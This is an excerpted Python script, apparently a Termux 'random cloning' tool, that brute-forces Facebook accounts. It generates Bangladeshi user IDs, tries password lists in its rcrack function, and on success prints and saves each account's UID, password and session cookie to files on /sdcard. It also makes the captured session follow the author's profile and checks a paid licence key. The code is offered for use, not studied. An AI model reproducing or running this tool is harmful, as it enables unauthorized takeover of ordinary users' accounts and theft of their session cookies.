...
print("\033[1;92m   [•] ASSALAMUALIKUM\033[1;30m")

os.system('espeak -a 300 "Assalamualaikum   Welcome To Shamim Random Cloning Tools"')

print("\033[1;92m   [•] WELCOME TW SHAMIM RANDOM CLONING TOOLS \033[1;30m")
...
def shamim():
    ...
    print('\033[1;37m[3] JOIN MY FACEBOOK GROUP')
    print('\033[1;37m[0] EXIT')
    opt = input('\033[1;37m[★] CHOOSE : ')
    if opt == '1':
        menu()
    if opt == '2':
        os.system("xdg-open https://www.facebook.com/ashrafullslam.jewel.5")
        menu()
...
def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://mbasic.facebook.com/profile.php?id=100089763362491', {
...
══════════════════════════════════════════════════════           [✯] DEVELOPER: Shamim Hossen
 [✯] FACEBOOK : Shamim Hossen
 [✯] FB GROUP : TERMUX HACKER SHAMIM
 [✯] GITHUB   : SHAMIM-CYBER
...
a=requests.get("https://www.facebook.com/100026507254245/posts/pfbid038LifNepCuterLeXQD7vnbVikmUt2P29gb8LRn6yTGEKiWgrpdXocGfuBzw55bW8al/?app=fbl").text
b=str(a)
key1=open("/storage/emulated/0/android8.txt",'r').read()
key2=str(key1)  
if key2 in b:
    ...
    print("Your key  : "+key2)
    print("\n\t\tContact Admin ")
    os.system('xdg-open https://wa.me/+8801884250097')
    exit()
...
def menu():
    clear()
    print('\033[1;33m[1] 8 DIGIT ID CLONE  BD\033[38;5;196m[\033[38;5;46mSUPER-FAST\033[38;5;196m]')
    print('\033[1;33m[2] 7 DIGIT ID CLONE  BD\033[38;5;196m[\033[38;5;46mSUPER-FAST\033[38;5;196m]')
    print('\033[1;33m[3] 6 DIGIT ID CLONE  BD\033[38;5;196m[\033[38;5;46mSUPER-FAST\033[38;5;196m]')
    print('\033[1;33m[4] 8 DIGIT ID CLONE  BD\033[38;5;196m[\033[38;5;46mPRO-MAX\033[38;5;196m]')
    print('\033[1;33m[5] 7 DIGIT ID CLONE  BD\033[38;5;196m[\033[38;5;46mPRO-MAX\033[38;5;196m]')
    print('\033[1;33m[6] 6 DIGIT ID CLONE  BD\033[38;5;196m[\033[38;5;46mPRO-MAX\033[38;5;196m]')
    print('\033[1;33m[7] MIX ID CLONE BD\033[38;5;196m[\033[38;5;46mSLOW\033[38;5;196m]')
    linex()
...
def rcrack(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write('\r\r\033[1;37m[SHAMIM\033[1;37m]  [%s/%s]  OK-%s'%(loop,tl,len(oks))),
            sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                uid = "1000"+coki1[0:11]
                print('\r\r\033[38;5;46m[SHAMIM-CYBER-OK] '+uid+ ' | ' +ps+ ' \n\033[1;37m[\033[38;5;46mCOOKIE😻\033[38;5;196m=\033[1;37m] \033[38;5;46m'+coki+'')
                open('/sdcard/SHAMIM-CYBER-11OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
                ...
                coki1 = coki.split("1000")[1]
                uid = "1000"+coki1[0:11]
                #print('\r\r\033[1;31m[SHAMIM-CYBER-CP] '+uid+ ' | ' +ps+'')
                open('/sdcard/SHAMIM-CYBER-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                uid = "1000"+coki1[0:11]
                print('\r\r\033[38;5;46m[SHAMIM-CYBER-OK] '+uid+ ' | ' +ps+ ' \n\033[1;37m[\033[38;5;46mCOOKIE 😻\033[38;5;196m=\033[1;37m] \033[38;5;46m'+coki+'')
                open('/sdcard/SHAMIM-CYBER-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
